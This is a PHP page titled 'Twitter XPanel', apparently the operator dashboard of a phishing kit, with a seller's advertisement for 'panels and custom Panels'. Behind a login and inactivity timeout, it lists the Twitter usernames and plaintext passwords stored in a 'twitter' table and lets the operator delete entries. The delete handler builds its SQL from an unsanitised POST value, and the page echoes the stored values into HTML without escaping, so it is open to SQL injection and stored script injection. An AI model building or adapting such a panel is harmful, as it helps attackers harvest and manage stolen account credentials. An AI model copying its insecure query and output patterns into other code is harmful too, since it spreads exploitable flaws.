<?php
session_start();

// Check if the user is not logged in
if (!isset($_SESSION["user"])) {
    // Store the intended page in the session
    $_SESSION["intended_page"] = $_SERVER["PHP_SELF"];
    header("Location: ../Lock/lock.php"); // Redirect to the login page
    exit();
}






// Check for inactivity
if (isset($_SESSION['last_activity']) && (time() - $_SESSION['last_activity'] > 600)) {
    // More than 10 minutes of inactivity, log the user out
    session_unset();
    session_destroy();
    header("Location: ../Lock/logout.php");
    exit();
} else {
    // Update last activity timestamp
    $_SESSION['last_activity'] = time();
}

?>

<!DOCTYPE html>
<html>
<head>
    <title>RS Panel</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer" />
    <link rel="stylesheet" href="xpanel.css"/>
</head>
<body>
    <header>
       <h1> Twitter XPanel</h1>
       
    </header>
    <nav>
   
        <ul>
           <form method="post" action="../Lock/logout.php">
        <input type="submit" value="Logout" class="delete-button">
    </form>
            <!-- Add more pages as needed -->
        </ul>
        <h4>contact With SamiR.BhuiyaN For panels and custom Panels <bold>Contact:<a class="fa-brands fa-facebook"></a>
        <a class="fa-brands fa-github"></a>
       </bold></h4> 
    </nav>
    

    <!-- Content for RS Panel -->
    <div id="content">
        <?php
        include "../database/database.php"; // Include your database connection

        if (
        	$_SERVER["REQUEST_METHOD"] === "POST" &&
        	isset($_POST["delete_id"])
        ) {
        	$userId = $_POST["delete_id"];

        	$sql = "DELETE FROM twitter WHERE Id = $userId";

        	if ($conn->query($sql) === true) {
        		echo '<script>alert("Delete successful for ID ' .
        			$userId .
        			'");</script>';
        	} else {
        		echo '<script>alert("Error deleting user: ' .
        			$conn->error .
        			'");</script>';
        	}
        }

        $query = "SELECT * FROM twitter";

        echo '<table border="1" cellspacing="2" cellpadding="2"> 
              <tr> 
                  <th> <font face="Arial">ID</font> </th> 
                  <th> <font face="Arial">Username</font> </th> 
                  <th> <font face="Arial">Password</font> </th> 
                  <th> <font face="Arial">Action</font> </th>
              </tr>';

        if ($result = $conn->query($query)) {
        	while ($row = $result->fetch_assoc()) {
        		$id = $row["Id"];
        		$username = $row["username"];
        		$password = $row["password"];

        		echo '<tr> 
                          <td>' .
        			$id .
        			'</td> 
                          <td><input type="text" size="20" value="' .
        			$username .
        			'" readonly></td> 
                          <td><input type="text" size="20" value="' .
        			$password .
        			'" readonly></td>
                          <td>
                              <form method="POST" action="">
                                  <input type="hidden" name="delete_id" value="' .
        			$id .
        			'">
                                  <input class="delete-button" type="submit" value="Delete">
                              </form>
                          </td>
                      </tr>';
        	}
        	$result->free();
        }
        ?>
    </div>


<!-- JavaScript code for handling browser close -->
<script>
    window.addEventListener('beforeunload', function (e) {
        // Make an AJAX request to log the user out
        var xhr = new XMLHttpRequest();
        xhr.open('GET', '../Lock/logout.php', false);
        xhr.send();
    });
</script>

 

</body>
</html>